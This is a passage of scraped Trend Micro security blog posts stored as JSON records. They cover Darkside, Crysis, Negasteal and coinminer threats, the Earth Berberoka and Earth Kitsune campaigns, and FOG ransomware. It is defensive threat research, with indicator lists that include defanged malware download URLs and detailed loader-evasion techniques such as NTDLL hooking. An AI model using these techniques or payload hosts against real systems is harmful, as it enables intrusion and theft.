Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of Compromise The IOCs for this article can be found here.\nActual indicators might vary per attack.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":64,"metadata":{"source":"blog","platform":"trendmicro","filename":"Conti"}}
{"id":188,"title":"Threat Recap: Darkside, Crysis, Negasteal, Coinminer | Trend Micro (US)","publish_date":null,"link":"https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/threat-recap-darkside-crysis-negasteal-coinminer","clean_text":"Threat Recap: Darkside, Crysis, Negasteal, Coinminer Insights and analysis by Miguel Ang, Raphael Centeno, Don Ovid Ladores, Nikko Tamaña, and Llallum Victoria In the past few weeks, we have spotted notable developments for different types of threats.\nFor ransomware, a new family named Darkside surfaced, while operators behind Crysis/Dharma released a hacking toolkit.\nFor messaging threats, a targeted email campaign was used to propagate Negasteal/Agent Tesla.\nFinally, for fileless threats, a coinminer was seen bundled with legitimate applications.\nRead on to know more about these findings.\nDarkside ransomware surfaced A new ransomware family named Darkside (detected by Trend Micro as Ransom.\nWin32.DARKSIDE.YXAH-THA) has emerged.\nOperators behind this ransomware threaten to publish unpaying victims’ data, a similar tactic employed by operators of ransomware families such as Maze and Nefilim.\nThe file extension used to append the names of encrypted files is based on the victim’s MAC address.\nAccording to the ransomware's Tor webpage, the threat actors behind the ransomware check the potential target company’s financial capability.\nFrom there, they determine how much ransom their targets will pay.\nIt was also indicated that the operators will not attack organizations under the medical, education, non-profit, and government sectors.\nFigure 1.\nA Darkside ransom note Crysis operators released a hacking tool kit Crysis/Dharma ransomware (detected by Trend Micro as Ransom.\nWin32.CRYSIS.TIBGGS) has released a hacking toolkit named Toolbox, Sophos reports.\nToolbox contains Mimikatz to harvest passwords, NirSoft Remote Desktop PassView to steal remote desktop protocol (RDP) passwords, Hash Suite Tools Free to dump hashes, and other tools to help find target computers and deploy the ransomware payload.\nWith this kit, even rookie hackers can infiltrate networks easily.\nCrysis operates under a ransomware-as-a-service (RaaS) model, and this hacking tool only makes it easier for affiliates to spread the ransomware to more targets.\nNegasteal/Agent Tesla delivered via emails targeting bank account holders We recently found emails that deliver Negasteal/Agent Tesla (detected by Trend Micro as TrojanSpy.\nMSIL.NEGASTEAL.DYSGXT) through malicious attachments.\nThe scheme targets account holders of Krung Thai Bank.\nThe email informs the recipient of a supposed “outward remittance transaction” worth almost US$9,000.\nThis prompts users to download the attachment which contains a document that exploits CVE-2017-11882 (also known as Microsoft Office Memory Corruption Vulnerability), a 17-year old memory corruption issue in Microsoft Office, to download and run the malware payload.\nDiscovered in 2014, Negasteal has been known to send stolen information through web panel, FTP or SMTP.\nMore recently, we spotted it being distributed through removable drives as it harvests credentials from Becky!\nInternet Mail.\nFigure 2.\nSample email with malicious attachment containing Negasteal Legitimate applications bundled with coinminer We also found legitimate applications such as TeamViewer, Rufus, and YTD Video Downloader bundled with a fileless coinminer (detected by Trend Micro as Coinminer.\nWin32.MALXMR.THHADBO).\nThese installers do not come from official download centers or app stores.\nUpon download, the legitimate application and a malicious script (VBS file) are dropped into the user’s system.\nThe malicious script then connects to a site to download the coinminer loader, which will then be used to load the coinminer.\nBundling coinminers and other malware types with legitimate installers of applications (such as video conferencing apps) is not a novel strategy; however, users who are not yet too familiar with this fact might unwittingly download from suspicious sources and inadvertently compromise their systems.\nFigure 3.\nCoinminer bundled with TeamViewer installer Figure 4.\nObfuscated VBS file Defense against a variety of threats The fast-paced nature of the cybersecurity landscape means that threats emerge at every turn, creating a never-ending race between threat actors and security researchers.\nEnterprises and individual users should keep abreast of developments so that they can perform the necessary actions to prevent these threats from compromising their systems.\nAs the popular adage says, “knowing is half the battle”.\nTo tackle a variety of threats, enterprises and users are advised to develop good security practices with the help of the following: - Only download apps from official download centers or app stores. -\nNever click links and download attachments from emails or any other messages that come from untrustworthy sources. -\nRegularly update software and applications to ensure that the latest vulnerabilities are patched. -\nEquip systems with security solutions that can block and defend against threats.\nThe following solutions can help secure against a variety of threats: - Trend Micro Apex One™ and Apex One Endpoint Sensor – Employs behavioral analysis that protects against malicious scripts, injection, ransomware, and memory and browser attacks related to fileless threats. -\nTrend Micro XDR – Connects email, endpoints, servers, cloud workloads, and networks to detect and respond to threats earlier. -\nTrend Micro™ Email Security – Uses enhanced machine learning and dynamic sandbox analysis for file and URL to stop email threats.\nOverall, a multilayered security approach is advised to guard all possible threat entry points.\nIndicators of compromise Darkside ransomware | SHA-256 | Trend Micro pattern detection | | 9cee5522a7ca2bfca7cd3d9daba23e9a30deb6205f56c12045839075f7627297 | Ransom.\nWin32.DARKSIDE.YXAH-THA | URL - hxxp://darksidedxcftmqa[.]onion/ Crysis/Dharma ransomware | SHA-256 | File name | Trend Micro pattern detection | | 1cec5e4563e2c1570353e54a4ecc12ab4d896ab7227fd8651adcd56b884c0c1c | GdAgentSrv.de.dll | HackTool.\nWin64.CVE20160099.A | | 28042dd4a92a0033b8f1d419b9e989c5b8e32d1d2d881f5c8251d58ce35b9063 | process-hacker-2-39.exe | PUA.Win32.ProcHack.\nA | | 3680b9e492f49abc108313c62ceb0f009d5ed232c874cae8828c99ebf201e075 | takeaway.exe | Ransom.\nWin32.CRYSIS.TIBGGS | | 47dc3672971c242154a36622145de7060f17f56af75d21e2130e4f57089f5e48 | takeaway.exe | Ransom.\nWin32.CRYSIS.TIBGGS | | 75d9d85b152e030eb73d17c691203b49bf593ea6a4bddeae48ca255b22c2d36d | takeaway_ps1 | Trojan.\nPS1.CRYSIS.AA | | 77cbab006cf6a801dbd1c752659bddf28562fb8681d20305dd1dc0b1e105c67a | takeaway.exe | Ransom.\nWin32.CRYSIS.TIBGGS | | 78983ad10fe05fadccb201dd3e8c7f952e93332433a42e3d331531c5497d1330 | winhost.exe | Ransom.\nWin32.CRYSIS.TIBGGQ | | b0b8fd4f6ab383014ea225c2b7776735af059f526cd7c4fdbdcb2e99d074ade7 | takeaway.exe | Ransom.\nWin32.CRYSIS.TIBGGS | | b2d2f4ecbc680d590743044744b3ff33c38e4aeb0ada990b0ae7be8291368155 | takeaway.exe | Ransom.\nWin32.CRYSIS.TIBGGS | | b5a69f7c4a3681a753f3512e3b36ac06c6ddbb1129a3e87f8c722ff4f9834f0a | purgeMemory.ps1 | Trojan.\nPS1.KILLSVC.Ahacktool | | edef024abe48d6ed7b4757d63a8fd448a8ecf1ad15afd39cc97c97b27ed4498e | takeaway.exe | Ransom.\nWin32.CRYSIS.TIBGGS | | ef5f2ce1a4d68d656400906ae906b0c7e7f61017f14840a7ac145d59ee69a4bd | takeaway.exe | Ransom.\nWin32.CRYSIS.TIBGGS | | f47e3555461472f23ab4766e4d5b6f6fd260e335a6abc31b860e569a720a5446 | NS2.ex | HackTool.\nWin32.NetTool.\nA | Negasteal/Agent Tesla | SHA-256 | Trend Micro pattern detection | | 58e74875b3659fa34aa1ecefba1a43cc049b7bb1c83de5a26ec8045c60f1099e | Trojan.\nW97M.CVE201711882.YQUOOUM | | 6991150c06b278712b052377ef768ca80923ff9c3396e7de18fa0fbce7211c96 | TrojanSpy.\nMSIL.NEGASTEAL.DYSGXT | Coinminer | SHA-256 | Trend Micro pattern detection | Trend Micro machine learning detection | | 12434186b803afd5e75b77bf8439d968 ef0bb18ed8a871a279b95fe0a6c4e132 | Coinminer.\nWin32.MALXMR.THHADBO | Troj.\nWin32.TRX.XXPE50FFF036 | | 2da7be1ed9f13424c7b747caea0030b5 b19007597640e9700add15bc8d236a1e | Trojan.\nWin32.MALXMR.THHADBO | Not Applicable | | 329788672911aaed64ba2add41a09f93 b878bf8a3291c1309988acadb3643141 | Trojan.\nVBS.MALXMR.THHADBO | Not Applicable | | 663e4b7c209e864faaf598d791a9a6958 c70f75bf974853d59bd15bc2a931163 | Trojan.\nWin32.MALXMR.BX | Not Applicable | | 9dade12201cc88cbd90f2fbaf4d50e51 2d4a377debad6714f19e10195e3a91be | Trojan.\nWin32.MALXMR.BX | Not Applicable | | a24f84fa1302c9f4b68791532d2d7dbb 0269e2ac2f245652164934289a1ba37e | Trojan.\nWin32.MALXMR.BX | Not Applicable | | a78c0bd4cf9f4e21dea1fa67e92a6498 c5df83c3ae57bb1f02d40da44e55cd69 | Coinminer.\nWin32.MALXMR.THHADBO | Troj.\nWin32.TRX.XXPE50FFF036 | | ae54783709a60e685846b3812d4e65b 54672c8c40d2e8499fa92255ef89b7375 | Trojan.\nWin32.MALXMR.BX | Not Applicable | | cd4b97c42b5ce9540f141498e2fdd4d5 66ea0b835d0c295994bf644744b5d4dd | Trojan.\nWin32.MALXMR.BX | Not Applicable | URLs - hxxps://pastebin[.]com/raw/jimA8sdx - hxxp://135[.]181[.]34[.]1/min3/loader23435345465446[.]jpg - hxxps://pastebin[.]com/raw/Yvyd9wXa - monerohash[.]com:3333 Like it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":85,"metadata":{"source":"blog","platform":"trendmicro","filename":"Crysis"}}
{"id":189,"title":"New APT Group Earth Berberoka Targets Gambling Websites With Old and New Malware | Trend Micro (US)","publish_date":null,"link":"https://www.trendmicro.com/en_us/research/22/d/new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html","clean_text":"New APT Group Earth Berberoka Targets Gambling Websites With Old and New Malware We recently found a new advanced persistent threat (APT) group that we have dubbed Earth Berberoka (aka GamblingPuppet).\nThis APT group targets gambling websites on Windows, macOS, and Linux platforms using old and new malware families.\nWe recently discovered a new advanced persistent threat (APT) group that we have dubbed Earth Berberoka (aka GamblingPuppet).\nBased on our analysis, this group targets gambling websites.\nOur investigation has also uncovered that Earth Berberoka targets the Windows, Linux, and macOS platforms, and uses malware families that have been historically attributed to Chinese-speaking individuals.\nIn this blog entry, we provide an overview of the Windows malware families used by Earth Berberoka in its campaign.\nThis malware lineup includes tried-and-tested malware families that have been upgraded, such as PlugX and Gh0st RAT, and a brand-new multistage malware family that we have dubbed PuppetLoader.\nWe discuss the full technical details of Earth Berberoka’s malware families aimed at Linux and macOS as well as Windows, infection vectors, targets, and possible connections with other APT groups in our research paper “Operation Earth Berberoka: An Analysis of a Multivector and Multiplatform APT Campaign Targeting Online Gambling Sites.”\nTechnical analysis PuppetLoader We discovered a new malware family that we have dubbed PuppetLoader.\nIt is a complex, five-stage malware family that uses some interesting techniques, including hijacking loaded modules to launch malicious code and hiding malicious payloads and modules in modified bitmap image (BMP) files.\nStage 1: Obfuscator and loader Incorrect RC4 implementation In this stage, a blob of payload data is decrypted using a hard-coded key (2726c6aea9970bb95211304705b5f595) and what appears to be an RC4 (Rivest Cipher 4) algorithm.\nHowever, the cipher’s “swap” operation in the pseudorandom generation part of the cipher code was improperly implemented.\nThis resulted in the proper encryption of only the headers and the first few sections of the payload, while the latter sections were left almost entirely in clear text.\nIt seems that this hard-coded key and flawed RC4 implementation were also used in a malware family named TigerPlug, probably because it spreads the PlugX malware.\nWe found no public reporting of its behavior and features.\nHijacking loaded module After the payload is decrypted, it is loaded in the machine’s memory and is executed using a stealthy method: PuppetLoader starts by loading a legitimate DLL from the Windows\\System32 directory.\nThe loading process is then hijacked to replace the legitimate library with a malicious one.\nThis is done by hooking NTDLL APIs such as NtQueryAttributesFile, NtOpenFile, NtCreateSection, NtMapViewOfSection, NtQuerySection and ZwClose.\nThe loader uses undocumented NTDLL APIs, such as RtlPushFrame, RtlPopFrame, and RtlGetFrame, to avoid recursive booking, which happens when a hooked function indirectly calls itself.\nTo properly load the malicious payload, a frame tagged as “LDFM” is allocated and filled with the necessary parameters, such as file names’ memory addresses and allocated buffer handles or addresses that contain the malicious payload.\nAfter their values are identified, some parameters are set immediately, while others are set at a later time.\nLdrLoadDll is then called to load a legitimate asyclfilt.dll library.\nAfterward, previously hooked API functions are called, resulting in the loaded DLL name’s being replaced with lz32.dll, which is a legitimate DLL.\nThe content of this legitimate DLL is then replaced by a malicious payload that is inside the hooked NtMapViewOfSection function.\nThen, the LdrLoadDll function rebases the newly loaded malicious image and loads all of the needed dependencies.\nThe malware no longer needs the frame once the handle is returned from the LdrLoadDLL function, which is why it pops the frame by calling RtlPopFrame, unhooks previously hooked functions, and verifies whether the loading is successful or not by calling GetModuleHandleW (asycfilt.dll).\nThe malware then dynamically resolves the export function called Install and sets the parameter value to “11BF29E1371C0D83C530BD1BF346”, which decrypts to a function called OneTime.\nFor its command-line parameters, PuppetLoader uses the same flawed RC4 implementation using the password “whk0q9ogev6ofg8d”.\nThese hijacking steps result in the following: - The loaded asycfilt.dll module can be seen by parsing the PEB_LDR_DATA structure that contains all loaded modules in the current process. -\nlz32.dll is opened based on process monitoring tools. -\nOnly PuppetLoader’s dropper payload is loaded and none of the previously mentioned libraries is actually loaded.\nStage 2: Dropper The dropper creates and drops several files in an infected machine.\n| File | Function | | CpuppetProcessFileSharer | Used for sharing data during the different infection stages | | Config.ini | Saves the execution reason and the globally unique identifier (GUID) value based on ComputerName | | MSVCPX00.dll | DLL file of BasicLoader | | verisign.bmp | BMP file with encrypted Core | | bitmap.bmp | BMP file with encrypted Client.\nMainConsole | Table 1.\nThe files created and dropped by the dropper The hard-coded GUID ({78106D5F-CD1A-A8C4-A625-6863092B4BBA}) is inserted into CPuppetProcessFileSharer (C:\\\\Users\\\\Public\\\\Pictures\\\\Desktop.inf).\nWe believe that it serves as a marker that stage 2 has been completed.\nConfig.ini (C:\\Users\\Public\\Videos\\Config.ini) contains the GUID and the reason, which is the hard-coded value “StartupBasicLoader” encrypted using a key (whk0q9ogev6ofg8d).\nThe svchost.exe is started in suspended mode with this command-line parameter: -cmd -NoModuleLoadDLL -DisplayName=KeepAuthority.\nClient.\nMainConsole.x64.Release -InvokeMethodName=Run -InokeMethodParam=NULL” This is also encrypted with the previously mentioned key and a new thread is created within svchost.exe to make it load the BasicLoader payload, MSVCPX00.dll.\nIt is interesting to note that there is a typographical error in “-InokeMethodParam.”\nStage 3: BasicLoader The BasicLoader stage starts by adding a hard-coded GUID ({78106D5F-CD1A-A8C4-A625-6863092B4BBA}) into CPuppetProcessFileSharer.\nAs with stage 2, we believe that this is likely a marker that stage 3 has started running.\nBasicLoader searches for BMP files across directories in Users\\\\Public (Desktop, Documents, Downlaods, Music, Pictures, and Videos).\nIt checks each directory for BMP files that would pass the required structure.\nFor the BMP files that do, the payload appended to the BMP file is decrypted, loaded into memory, and executed.\nThe BMP file is made up of only 33 x 11 pixels and 338 bytes, and the data appended to it is the payload that is encrypted with the same flawed RC4 implementation.\nStage 4: Core This stage begins when a hard-coded GUID ({7D8DA9DC-1F3B-2E5C-AA59-9418E652E4AA}) is added to CPuppetProcessFileSharer.\nSimilar to the other stages, this is likely a marker that stage 4 has started running.\nAfter this, the malware starts a system logger thread, where the logged information is received via a pipe and is saved to a file with a hard-coded name.\nThe logged information can come from other modules or processes.\nBased on our analysis, each log file entry is separated by a separator (0xAABBCCDD), followed by a custom RC4 password and message length.\nThe decrypted log can include the following information: - The module that was run - The parameters at which this module was run - At which stage (GUID from CPuppetProcessFileSharer) the action was performed The following command-line arguments are also implemented during this stage: - -DisplayName - -InokeMethodParam (sic) - -InvokeMethodName - -NoModuleLoadDLL - -LoadShellcode While the other arguments are mostly self-explanatory, we highlight two arguments worth noting: -NoModuleLoadDLL uses the same technique as the stage 1 loader and -LoadShellcode allocates a memory block, copies shellcode, and executes it.\nStage 5: Client.\nMainConsole This is the main client binary written in C++, which is the last stage of PuppetLoader’s infection chain.\nThe code is structured in several classes that handle different tasks, such as managing the interactive shell, uploading and downloading files, installing new modules, monitoring victim behavior, and executing callback functions when conditions are met. -\nCPipeCmdManager – interactive shell manager Arguments: -flushusersession -createcmd -destorycmd (sic) -excutecmd -cmdkeepalive - CommonLib::CcmdMulArgDecoder – command-line argument decoder, additional module related to command-line arguments Arguments: -ModuleLog -LogText -ModuleID -ModuleVersion -MountStatus -Path -IsDelete -ModuleKeepAlive -UploadFile The client then establishes communication with a command-and-control (C&C) server via UDP (User Datagram Protocol) and recognizes different types of custom UDP packets: | UDP packet | Description | | RemoteModuleCommandPacket | Command to be executed by interactive shell | | RemoteModuleCommandResultPacket | Result of running shell command | | FileTransferContent_Packet | Determines whether to upload or download a file | | UploadFilePacket | Uploaded file content | | FileManage_FolderContent_Packet | Folder content | | VecProcessPacket | Vector object with running processes | | InstallModulePacket | BMP with encrypted module to be installed | | RemoteClientSystemInfoPacket | Sent by login callback every time a new user logs in | | ModuleKeepAlivePacket | Tells the C&C server that the connection is still alive | Table 2.\nThe custom UDP packets recognized by the client The backdoor functions implemented in the main client are: - Interactive shell - Upload file - Download file - List files - Terminate process - List processes - Install module - Login callback - Enumerate RDP sessions The communication protocol via UDP uses the same RC4 encryption.\nA sent and/or received packet contains a 16-byte RC4 key and the length of an RC4-encrypted payload, followed by another packet with the encrypted payload itself.\noRAT Another malware family that we obtained both Windows and macOS samples of during our investigation was oRAT.\nInterestingly, this was the first time that we had analyzed samples of this malware family written in the Go language.\nThe oRAT droppers that we found in our analysis were a MiMi chat application built using the Electron JS framework and a DMG (disk image) file.\nWe discuss the full details of both in our research paper.\nThe samples are flagged as version 0.5.1 for both Windows and macOS samples, and have the same features and configurations.\nThe configuration file and the AES decryption key are appended in an encrypted form to the PE (Portable Executable) file overlay.\nThe configuration is decrypted using the AES-GCM (AES with Galois/Counter Mode) algorithm.\nThe malware then parses it and enables the gateway or traffic forwarder mode if it is specified in the configuration settings.\nFor the malware operator to directly connect to an infected machine and execute commands via GET or POST requests, the malware starts local servers on the infected machine to listen on ports that have been specified in the configuration settings for control commands.\nThe network communications can be in plain text or encrypted, depending on the configuration of the file: - “tcp” for plain text - “stcp” for encrypted TCP communications using the golang-tls library - “sudp” for encrypted UDP traffic using the Quic-go library The control server is implemented by registering routes.\nThis simple mechanism leads to translating GET/POST requests directly as internal Go commands.\nRequesting a URL therefore results in executing the corresponding code on an infected system.\nWe obtained oRAT samples that register these routes: - GET /agent/info - GET /agent/ping - POST /agent/upload - GET /agent/download - GET /agent/screenshot - GET /agent/zip - GET /agent/unzip - GET /agent/kill-self - GET /agent/portscan - GET /agent/proxy - GET /agent/ssh - GET /agent/net PuppetDownloaders (C++ downloaders) During our investigation, we also saw malicious websites that distribute fake Adobe Flash Player updates that were actually delivering C++ downloaders.\nThe infection starts with an executable written in C++ that connects through a Winsock API to a domain or IP address in a specific port.\nThe downloaded content is saved as SMTemp.dat, and using the executable’s file name and a hard-coded XOR key, a file named Loader.dll is decrypted and copied to the disk.\nIf the executable is renamed for whatever reason, the DLL decryption fails and the malware’s second stage does not go through.\nIf the SMTemp.dat file exists, the Loader.dll file executes it.\nAfter that, the loader decrypts a legitimate Adobe Flash Player installer and executes it, in order to deceive the victim into thinking that the executable is a legitimate installer.\nDuring our investigation, we noted that the server hosting the second stage of the PuppetDownloaders malware payload was offline.\nIt is also interesting to note that the string decryption routine of this malware is a simple XOR with the string “2020-05-24 13:00:29” as its key.\nThe first 13 bytes of the password that is used to decode the string are the same as the last 13 bytes.\nWe dubbed these downloaders PuppetDownloaders since they are connected to the PuppetLoader malware family, as evidenced by our observations: - This malware and PuppetLoader both use the same string decryption routine that uses the same key. -\nThis malware and PuppetLoader both use the same XOR key (2726c6aea9970bb95211304705b5f595) that is used to decrypt the embedded Loader.dll file. -\nThis malware and PuppetLoader’s decrypted Loader.dlls share similar strings such as “[-] UnExist pwszModuleFunName:”.\nThis suggests that a common framework was used to compile both DLLs.\nMFC socket downloaders We also saw WinRAR self-extracting (SFX) files dropping downloaders written using the Microsoft Foundation Class Library (MFC) framework.\nThese MFC socket downloaders have an identical structure: One function creates a socket, connects to a domain or IP address, sends a short string, and then calls “recv” twice.\nThe code flow is redirected through a call to EnumDesktopsA or EnumWindows, whose callback function pointers point to the downloaded content.\nThe downloaders attempt to access ports 8080, 29527, and 8885.\nThey also send the strings “feiji”, “@5436”, and “fhfgj@jfggdsg” to the sockets.\nWe found multiple additional samples of the same malware family that have the same structure and send the same strings.\nHowever, it is possible that multiple groups might be covertly sharing the source code for this malware.\nPlugX PlugX is a remote access tool (RAT) that has been used as a malicious tool for espionage for more than a decade.\nWe found that Earth Berberoka uses PlugX to target 32-bit and 64-bit architectures, based on the samples we obtained and analyzed.\nThis malware family sends a DWORD, a 32-bit unsigned integer, in the HELLO packet.\nA compromised system then sends the HELLO packet, which looks like a date in the “yyyymmdd” format, to the C&C server.\nWe found the following DWORDs in multiple samples we analyzed, which suggest that the versions we found were developed within the last three years: 20190520, 20201106, and 20210804.\nAll of the samples we found are loaded in the same way: A legitimate and signed file that is vulnerable to DLL sideloading is placed alongside a malicious DLL, which decrypts and loads the third file containing the final payload.\nOne of these malicious DLL files has the PDB (program database) path C:\\Users\\Administrator\\Desktop\\Plug7.0(Logger)\\logexts\\x64\\Release\\logexts.pdb.\nGh0st RAT We also saw at least three different variants of Gh0st RAT, another malware family that has been in the wild for more than 10 years, being used in Earth Berberoka’s campaign.\nThis malware family’s source code is public, which is why it has many variants.\nOne of the variants we analyzed had an interesting destructive feature: It replaces the master boot record (MBR) to display an explicit message (“I am virus !\nF*ck you :-)”).\nThis particular message was also seen in a public report from a victim of this Gh0st RAT variant.\nA 2017 Industrial Control Systems Cyber Emergency Response Team (ICS-CERT) report also discussed how Gh0st RAT variants wiped the MBR and replaced it with messages that varied across different samples.\nOther Known Malware Families We also found other legitimate tools being abused by Earth Berberoka and a malware family being used by the group in its campaign: - Quasar RAT – a Windows-based open-source RAT that has been used by APT groups for network exploitation - AsyncRAT – an open-source RAT that can be used to remotely monitor and control devices via an encrypted connection - Trochilus – a stealthy RAT that can evade sandbox analysis and can be used in cyberespionage campaigns Security recommendations Our analysis points to Earth Berberoka’s having multiple tools and a large infrastructure at its disposal to target the Southeast Asian gambling market.\nTo avoid falling victim to Earth Berberoka’s attacks, users and operators of gambling websites can adopt the following security recommendations: - Properly vet emails, websites, and apps before clicking on links or downloading apps. -\nDownload apps only from trusted sources. -\nWatch out for malicious website flags, such as errors in grammar and spelling. -\nBlock threats that arrive via email, such as malicious links, through hosted email security and antispam protection. -\nUse a multilayered security solution that helps with detecting, scanning, and blocking malicious URLs.\nThe full technical details of our investigation can be found in our research paper, which we will publish soon.\nWe list down the indicators of compromise (IOCs) for Windows, Linux, and macOS in separate text files.\nWe also provide the domain list in a separate text file.","num_sentences":113,"metadata":{"source":"blog","platform":"trendmicro","filename":"Earth-Berberoka"}}
{"id":190,"title":"Operation Earth Kitsune: Tracking SLUB’s Current Operations | Trend Micro (US)","publish_date":null,"link":"https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-earth-kitsune-tracking-slub-s-current-operations","clean_text":"Download Operation Earth Kitsune: Tracking SLUB’s Current Operations We have already published findings on the SLUB malware’s past campaigns.\nIn our latest research paper, we uncovered a recent watering hole campaign that involves a new variant of the malware.\nThe threat, which we dubbed as such due to its abuse of Slack and GitHub in previous versions, has not abused either of the platforms this time; instead, it employed Mattermost, an open-source online chat service that can be easily deployed on-premise.\nIn an official statement regarding the issue, Mattermost denounced illicit and unethical use of their platform, as this is a definite violation of their Conditions of Use policy.\nThey also shared how users can report illicit use of the software.\nWe found Operation Earth Kitsune using a total of five C&C servers, seven samples, and four new bugs, aiming to compromise websites to host malware.\nWe initiated our investigation after noticing that the Korean American National Coordinating Council (KANCC) website was redirecting visitors to the Hanseattle website.\nUsers who accessed the said site were redirected to a weaponized version of a proof of concept (POC) for the CVE-2019-5782 Google Chrome vulnerability published in the chromium tracking system.\nDigging deeper, we discovered that the attack does not only involve a weaponized version of the mentioned Chrome exploit; the exploit was infecting the victim machine with three separate malware samples.\nFigure 1.\nThe campaign's infection chain CVE-2020-0674, a vulnerability in Internet Explorer, was also used to compromise websites.\nWhile a shellcode was used for the Chrome exploit, a PowerShell loader was used in the Internet Explorer exploit.\nBoth the samples delivered by the shellcode and PowerShell script connect to the same C&C servers.\nBesides the aforementioned behavior, the campaign was also seen exploiting other vulnerabilities, such as CVE-2016-0189¸ CVE-2019-1458, and the vulnerabilities cited in our previous reports on SLUB.\nLike the aforementioned affected sites, the compromised servers are using the GNUBoard Content Management System (CMS), some of them on either version 4 or version 5.\nBesides SLUB, two new malware variants, which we dubbed dneSpy and agfSpy, are also linked to this campaign.\nWhile SLUB's objective in this campaign is to exfiltrate system information, the two other malware variants were deployed to gain additional control of the affected user’s machine.\nWe believe that the operators of SLUB also released these malware variants.\nWe are currently investigating these samples and will share any pertinent findings.\nFigure 2.\nThe attack vectors used in the campaign The Chrome Attack Vector For the Chrome attack vector, the exploit used CVE-2019-5782 and another vulnerability that does not have an assigned CVE.\nTo deploy a weaponized version of this, the attacker reused a POC code.\nIt also implemented two customizations: the separation of the shellcode to load in from the Javascript encoded version, and the inclusion of support for other operating system versions.\nThe shellcode requests the dropper.dll from the network; after deobfuscation, it loads the DLL payload address space of the running process.\nDropper.dll checks the system for installed antimalware products by comparing the current processes to a predefined list.\nIf none are detected, the dropper will start downloading three samples, namely “1.jpg,” “2.jpg,” and “3.jpg.”\nThe Internet Explorer attack vector For the infection vector that uses the Internet Explorer exploit CVE-2020-0674, the exploit runs a shellcode, which executes a few stages of a PowerShell loader.\nSimilar to the shellcode used in the Chrome exploit chain, the PowerShell version checks if the affected system has any antimalware product installed.\nIf none are installed, the PowerShell proceeds to download and execute three backdoors.\nIf instructed in the LPE (Local Privilege Escalation) column, the PowerShell loader may also initiate the download and execution of an LPE binary exploiting CVE-2019-1458.\nSLUB's Use of Mattermost The SLUB variant used in this campaign employs Mattermost to keep track of its deployment by creating a channel for each infected machine.\nAll communication uses HTTP in port 443.\nFigure 3.\nMattermost server operating on port 443.\nThe malware’s communication with Mattermost requires an authentication token that can grant permissions for certain functions such as creating channels and sending posts to these channels.\nTo learn more about the attacker’s infrastructure, we reviewed Mattermost’s API.\nEventually, we were able to collect the following information: - The list of channels. -\nThe dump of all posts in each channel. -\nThe dump of all screenshots in each channel. -\nThe list of all users associated with the channels.\nThe actual list of users showed that the server was first set up on March 10, 2020.\nIt also gave us an insight into the roles each user plays and the kind of permissions they have; “system_admin” for the admin user, and “system_user_access_token” and “system_post_all_public” for regular users.\nFigure 4.\nMattermost server users’ accounts At the time of research, we found 15 users that are classified as follows: | User type | Count | | Bot user | 1 | | Regular user | 13 | | Admin user | 1 | Table 1.\nType and number of users created in the Mattermost server We have reached out to Mattermost regarding the abuse of the platform.\nHere is their official statement: “Mattermost’s open-source, self-managed collaboration platform is broadly used and co-created by developers and ethical security researchers.\nAs a community, we denounce illicit and unethical use, which is explicitly against Mattermost’s Conditions of Use policy.\nWe are grateful to our friends at Trend Micro for their contributions on this issue.\nFor more information on how to help, see: How do I report illicit use of Mattermost software?”\nFor more information and in-depth analysis of the SLUB malware’s recent campaign, read our research paper, “Operation Earth Kitsune: Tracking SLUB’s Current Operations”, which aims to shed light on SLUB's recent activities by analyzing the behavior of this quickly evolving malware.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":61,"metadata":{"source":"blog","platform":"trendmicro","filename":"Earth-Kitsune"}}
{"id":191,"title":"FOG Ransomware Spread by Cybercriminals Claiming Ties to DOGE | Trend Micro (US)","publish_date":"2024-06-28","link":"https://www.trendmicro.com/en_us/research/25/d/fog-ransomware-concealed-within-binary-loaders-linking-themselve.html","clean_text":"- In our investigation of nine samples uploaded on VirusTotal, we found that FOG ransomware is being distributed by cybercriminals trolling users by abusing the name of the Department of Government Efficiency (DOGE), or individuals connected to the government initiative. -\nThe investigated LNK file contained in a ZIP file named “Pay Adjustment.zip” is being distributed via email and phishing attacks and shows the continued activity of FOG ransomware. -\nTrend Vision One™ detects and blocks the FOG ransomware samples discussed in this blog.\nTrend Vision One customers can also access hunting queries, threat insights, and threat intelligence reports to gain rich context and the latest updates on FOG ransomware.\nDuring our monitoring of the ransomware threat landscape, we discovered samples with infection chain characteristics and payloads that can be attributed to FOG ransomware.\nA total of nine samples were uploaded to VirusTotal between March 27 and April 2, which we recently discovered were multiple ransomware binaries with .flocked extension and readme.txt notes.\nWe observed that these samples initially dropped a note containing key names related to the Department of Government Efficiency (DOGE), an initiative of the current US administration that has been making headlines, recently about a member who allegedly assisted a cybercrime group involved in data theft and cyberstalking an agent of the Federal Bureau of Investigation (FBI).\nThe note also contains instructions to 